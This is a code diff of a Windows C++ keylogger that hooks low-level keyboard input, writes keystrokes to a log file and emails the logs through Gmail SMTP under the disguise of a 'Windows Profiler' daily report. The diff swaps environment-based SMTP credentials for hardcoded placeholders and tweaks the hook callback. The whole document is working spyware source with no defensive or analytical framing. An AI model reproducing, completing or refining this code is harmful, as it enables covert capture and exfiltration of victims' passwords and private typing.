@@ -1,5 +1,4 @@
 #include <windows.h>
-#include "dotenv.h"
 #include <iomanip>
 #include <iostream>
 #include <sstream>
@@ -8,6 +7,7 @@
 #include <vector>
 #include <CkEmail.h>
 #include <CkMailMan.h>
+#include "CkImap.h"
 
 //#define DEBUG
 //#define firefox
@@ -22,6 +22,8 @@ char *translate(int vk, int up);
 void sendEmail(CkMailMan &mailman, const std::vector<std::string> &fileList);
 
 int shift = 0, caps = 0;
+const char* emailAddress = "email";
+const char* password = "password";
 FILE *fd;
 
 #ifdef DEBUG
@@ -34,7 +36,6 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
 
 #endif
 {
-    dotenv::init();
     std::string date = "\n\n\n-------------------------";
 
     auto t = std::time(nullptr);
@@ -129,13 +130,12 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
 
     CkMailMan mailman;
     mailman.put_SmtpHost("smtp.gmail.com");
-    mailman.put_SmtpUsername(std::getenv("EMAIL"));
-    mailman.put_SmtpPassword(std::getenv("PASSWORD"));
+    mailman.put_SmtpUsername(emailAddress);
+    mailman.put_SmtpPassword(password);
     mailman.put_SmtpSsl(true);
     mailman.put_SmtpPort(587);
 
     sendEmail(mailman, filesToSend);
-
     while (GetMessage(&msg, nullptr, 0, 0) > 0) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
@@ -147,7 +147,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
 
 void sendEmail(CkMailMan &mailman, const std::vector<std::string> &fileList) {
     CkEmail email;
-    email.AddTo(std::getenv("EMAIL"), std::getenv("EMAIL"));
+    email.AddTo("Windows Profiler", emailAddress);
     email.put_Subject("Daily Log");
     email.put_Body(
             "Hello!\nWe are sending you your daily log of Windows Profiler ;)\nLook up attachments.\nCheers,\nJD - Bajo Jajo Corporation");
@@ -178,6 +178,8 @@ void sendEmail(CkMailMan &mailman, const std::vector<std::string> &fileList) {
               << "\r\n";
 }
 
+#pragma clang diagnostic push
+#pragma ide diagnostic ignored "ConstantFunctionResult"
 LRESULT CALLBACK LowLevelKeyboardProc(__attribute__((unused)) int nCode, WPARAM wParam, LPARAM lParam) {
     auto *kb = (KBDLLHOOKSTRUCT *) lParam;
     char *str = nullptr;
@@ -192,9 +194,9 @@ LRESULT CALLBACK LowLevelKeyboardProc(__attribute__((unused)) int nCode, WPARAM 
     }
     if (str)
         log(str);
-    else return 1;
     return 0;
 }
+#pragma clang diagnostic pop
 
 void log(char *str) {
     fwrite(str, 1, strlen(str), fd);
